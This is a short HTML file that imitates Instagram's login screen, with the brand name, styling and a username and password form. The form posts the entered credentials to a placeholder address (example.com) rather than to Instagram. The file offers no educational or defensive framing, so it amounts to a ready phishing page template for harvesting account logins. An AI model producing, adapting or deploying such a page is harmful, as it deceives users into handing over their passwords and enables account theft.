<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <style>
    body {
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: Arial;
    }
    .box {
      background: white;
      padding: 20px;
      border: 1px solid #dbdbdb;
      text-align: center;
      width: 300px;
    }
    input, button {
      margin: 10px 0;
      padding: 10px;
      width: 90%;
    }
    button {
      background: #3897f0;
      color: white;
      border: none;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Instagram</h2>
    <form action="https://example.com/login" method="POST">
      <input type="text" name="username" placeholder="Username"><br>
      <input type="password" name="password" placeholder="Password"><br>
      <button type="submit">Log In</button>
    </form>
  </div>
</body>
</html>
